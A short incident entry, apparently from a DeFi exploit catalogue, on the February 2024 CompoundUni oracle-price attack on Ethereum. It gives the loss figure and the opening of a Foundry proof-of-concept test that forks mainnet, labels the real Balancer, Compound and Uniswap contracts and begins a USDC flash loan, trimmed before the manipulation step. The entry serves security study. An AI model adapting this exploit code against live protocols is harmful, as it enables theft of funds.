# [?] CompoundUni - Oracle bad price

## Summary
Severity: Unknown
Chain: Ethereum
Component: CompoundUni
Published: 2024-02-23
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/CompoundUni_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~439,537 USD

```solidity
contract ContractTest is Test {
    IBalancerVault public vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 public USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ICompoundcUSDC public cUSDC = ICompoundcUSDC(0x39AA39c021dfbaE8faC545936693aC917d5E7563);
    IComptroller public comptroller = IComptroller(0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B);
    IcUniToken public cUniToken = IcUniToken(0x35A18000230DA775CAc24873d00Ff85BccdeD550);
    IUNIV3Pool public UNI_WETH_Pool = IUNIV3Pool(0x1d42064Fc4Beb5F8aAF85F4617AE8b3b5B8Bd801);
    IUNI public uni = IUNI(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);
    IUNIV3Pool public WETH_USDC_Pool = IUNIV3Pool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    IWETH public WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IUniswapAnchoredView public UniswapAnchoredView = IUniswapAnchoredView(0x50ce56A3239671Ab62f185704Caedf626352741e);

    uint256 public AMOUNT = 193_020_254_960;

    function setUp() public {
        vm.createSelectFork("mainnet", 19_290_921 - 1);
        vm.label(address(vault), "Balancer vault");
        vm.label(address(USDC), "USDC");
        vm.label(address(cUSDC), "cUSDC");
        vm.label(address(comptroller), "comptroller");
        vm.label(address(cUniToken), "cUniToken");
        vm.label(address(UNI_WETH_Pool), "UNI_WETH_Pool");
        vm.label(address(uni), "uni");
        vm.label(address(WETH_USDC_Pool), "WETH_USDC_Pool");
        vm.label(address(WETH), "WETH");
    }

    function testExploit() public {
        console.log("USDC balance:");
        emit log_named_decimal_uint("   [INFO] Before attack", USDC.balanceOf(address(this)), 6);

        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = address(USDC);
        amounts[0] = AMOUNT;
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/CompoundUni_exp.sol_
